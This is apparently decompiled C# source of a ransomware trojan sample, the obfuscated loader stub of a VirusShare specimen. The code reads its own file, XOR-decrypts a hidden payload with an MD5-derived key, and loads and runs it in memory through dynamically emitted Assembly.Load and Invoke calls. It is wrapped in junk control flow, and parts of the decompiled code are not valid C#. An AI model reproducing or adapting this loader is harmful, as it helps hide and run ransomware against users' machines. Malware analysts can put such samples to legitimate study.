// Decompiled with JetBrains decompiler
// Type: .
// Assembly: login, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 061CE9EB-FBB3-4DCA-B887-96138CF302E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-c0ca04be5c9730001d9abfc173674c9bd0b8822885428484c55aef9eb324a0ec.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0001
{
  internal sealed class \u0002
  {
    static object \u0001()
    {
      int num1 = 363;
      if (num1 == 0)
        goto label_5;
      else
        goto label_8;
label_1:
      \u0001.\u0001.\u0001(408);
      int num2 = 10302;
      goto label_9;
label_4:
      \u0001.\u0001.\u0001(702);
      num1 = 300970495;
label_5:
      int num3 = 948571;
      num2 = 16044152;
      if (num2 == 0)
        goto label_9;
label_7:
      do
        ;
      while (true);
      goto label_4;
label_8:
      \u0001.\u0001.\u0001(num1);
      goto label_1;
label_9:
      num3 = num2;
      if (true)
      {
        if (true)
          goto label_4;
        else
          goto label_1;
      }
      else
        goto label_7;
    }

    static void \u0001([In] \u0002.\u0002.\u0001 obj0)
    {
      \u0001.\u0001.\u0001(783);
label_1:
      int num1 = 70555;
      int num2 = 1033;
      while (true)
      {
        \u0001.\u0001.\u0001(num2);
        bool flag1 = false;
        while (140 > 1)
          ;
        int num3 = 814490;
        if (num3 != 0)
        {
          if (true)
          {
            int num4 = (int) MessageBox.Show(\u0001.\u0001.\u0001(1154));
            flag1 = false;
          }
          else
            goto label_1;
        }
        else
          goto label_15;
label_9:
        int num5 = 1;
        while (true)
        {
          bool flag2 = num5 != 0;
          int num6;
          do
          {
            if (true)
            {
              num6 = 1;
              if (num6 != 0)
              {
                bool flag3 = num6 != 0;
              }
              else
                goto label_2;
            }
            else
              goto label_3;
          }
          while (false);
          break;
label_2:
          num5 = num6;
        }
        num1 = 100;
        flag1 = false;
        num3 = 0;
        goto label_15;
label_3:
        goto label_17;
label_15:
        if (num3 == 0)
        {
          flag1 = num3 != 0;
          8714.0 = 1.0;
        }
        else
        {
          num2 = num3;
          continue;
        }
label_17:
        goto label_9;
      }
    }

    static void \u0001([In] \u0002.\u0002.\u0002 obj0)
    {
      int num1;
      if (true)
        num1 = 1267;
      else
        goto label_4;
label_2:
      int num2;
      if (num1 == 0)
      {
        num2 = num1;
        goto label_11;
      }
      else
        \u0001.\u0001.\u0001(num1);
label_4:
      \u0001.\u0001.\u0001(1348);
      int num3 = 7845;
      goto label_13;
label_11:
      int num4;
      if (num2 == 0)
      {
        bool flag = num2 != 0;
        \u0001.\u0001.\u0001(1920);
        checked { ++num3; }
      }
      else
      {
        num4 = num2;
        goto label_14;
      }
label_13:
      num4 = num3;
label_14:
      string str;
      int num5;
      if (num4 <= 503)
      {
        while (true)
        {
          if (true)
            goto label_20;
label_8:
          num5 = 1614;
          if (num5 == 0)
          {
            518016 = num5;
            continue;
          }
          break;
label_20:
          goto label_8;
        }
        if (num5 != 0)
        {
          int num6 = (int) MessageBox.Show(\u0001.\u0001.\u0001(num5));
          num2 = 0;
          goto label_11;
        }
      }
      else
      {
        str = \u0001.\u0001.\u0001(1969);
        num1 = 1;
        if (num1 != 0)
        {
          bool flag = num1 != 0;
          flag = false;
          num5 = 2223;
        }
        else
          goto label_2;
      }
      str = \u0001.\u0001.\u0001(num5);
      while (true)
        ;
    }

    static byte[] \u0001(string _param0, string _param1)
    {
      StringBuilder stringBuilder = new StringBuilder();
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(_param1));
      int num1;
      int num2;
      int num3;
      if (true)
      {
        int length = _param0.Length;
        num3 = 1;
        num2 = length;
        num1 = 0;
      }
      else
        goto label_11;
label_4:
      int num4 = checked (num2 - num3);
      int startIndex = num1;
      goto label_17;
label_8:
      int num5;
      string str = Conversions.ToString((char) num5);
      int index;
      int num6;
      if (true)
      {
        stringBuilder.Append(str);
        num1 = index;
        num2 = _param1.Length;
        num3 = 1;
        if (num3 != 0)
        {
          int num7 = checked (num2 - num3);
          if (num1 != num7)
          {
            int num8 = index;
            if (true)
            {
              index = checked (num8 + 1);
              goto label_14;
            }
            else
            {
              num6 = num8;
              goto label_15;
            }
          }
        }
        else
          goto label_4;
      }
      else
        goto label_14;
label_11:
      index = 0;
label_14:
      num6 = startIndex;
label_15:
      num5 = checked (num6 + 2);
      if (true)
        startIndex = num5;
      else
        goto label_8;
label_17:
      if (startIndex > num4)
        return Encoding.Default.GetBytes(stringBuilder.ToString());
      long num9 = Conversions.ToLong(\u0001.\u0001.\u0001(2365) + _param0.Substring(startIndex, 2));
      long CharCode;
      while (true)
      {
        long num10 = (long) hash[index];
        CharCode = num9 ^ num10;
        if (false)
          num9 = CharCode;
        else
          break;
      }
      num5 = (int) Strings.Chr(checked ((int) CharCode));
      goto label_8;
    }

    static object \u0001(string _param0, byte[] _param1)
    {
      string name = \u0001.\u0001.\u0001(2370);
      System.Type returnType = typeof (object);
      System.Type[] typeArray1 = new System.Type[4];
      System.Type[] typeArray2;
      if (true)
        typeArray2 = typeArray1;
      typeArray2[0] = typeof (byte[]);
      typeArray2[1] = typeof (object[]);
      typeArray2[2] = typeof (string);
      typeArray2[3] = typeof (string);
      System.Type[] parameterTypes = typeArray2;
      DynamicMethod dynamicMethod = new DynamicMethod(name, returnType, parameterTypes);
      ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
      System.Reflection.Emit.Label label = ilGenerator.DefineLabel();
      ilGenerator.DeclareLocal(typeof (Assembly));
      ilGenerator.Emit(OpCodes.Ldarg_0);
      ilGenerator.EmitCall(OpCodes.Call, typeof (Assembly).GetMethod(\u0001.\u0001.\u0001(2375), new System.Type[1]
      {
        typeof (byte[])
      }), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Stloc_0);
      ilGenerator.Emit(OpCodes.Ldarg_2);
      ilGenerator.Emit(OpCodes.Brfalse_S, label);
      ilGenerator.Emit(OpCodes.Ldarg_3);
      ilGenerator.Emit(OpCodes.Brfalse_S, label);
      ilGenerator.Emit(OpCodes.Ldloc_0);
      ilGenerator.Emit(OpCodes.Ldarg_2);
      ilGenerator.EmitCall(OpCodes.Callvirt, typeof (Assembly).GetMethod(\u0001.\u0001.\u0001(2384), new System.Type[1]
      {
        typeof (string)
      }), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Ldarg_3);
      ilGenerator.EmitCall(OpCodes.Callvirt, typeof (System.Type).GetMethod(\u0001.\u0001.\u0001(2397), new System.Type[1]
      {
        typeof (string)
      }), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Ldnull);
      ilGenerator.Emit(OpCodes.Ldarg_1);
      ilGenerator.EmitCall(OpCodes.Callvirt, typeof (MethodBase).GetMethod(\u0001.\u0001.\u0001(2410), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Ret);
      ilGenerator.MarkLabel(label);
      ilGenerator.Emit(OpCodes.Ldloc_0);
      ilGenerator.EmitCall(OpCodes.Callvirt, typeof (Assembly).GetProperty(\u0001.\u0001.\u0001(2419)).GetGetMethod(), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Ldnull);
      ilGenerator.Emit(OpCodes.Ldarg_1);
      ilGenerator.EmitCall(OpCodes.Callvirt, typeof (MethodBase).GetMethod(\u0001.\u0001.\u0001(2410), new System.Type[2]
      {
        typeof (object),
        typeof (object[])
      }), (System.Type[]) null);
      ilGenerator.Emit(OpCodes.Ret);
      return dynamicMethod.Invoke((object) null, new object[4]
      {
        (object) _param1,
        (object) new object[0],
        (object) \u0001.\u0001.\u0001(2436),
        (object) _param0
      });
    }

    static void \u0001()
    {
      try
      {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        MemoryManager.\u0001 = new MemoryManager();
      }
      catch
      {
      }
    }

    static void \u0001()
    {
      string[] strArray = Strings.Split(File.ReadAllText(\u0002.\u0002.\u0002.\u0001), \u0001.\u0001.\u0001(2441));
      byte[] numArray = \u0001.\u0002.\u0001(strArray[18], strArray[1]);
      \u0001.\u0002.\u0001(\u0001.\u0001.\u0001(2458), numArray);
    }
  }
}
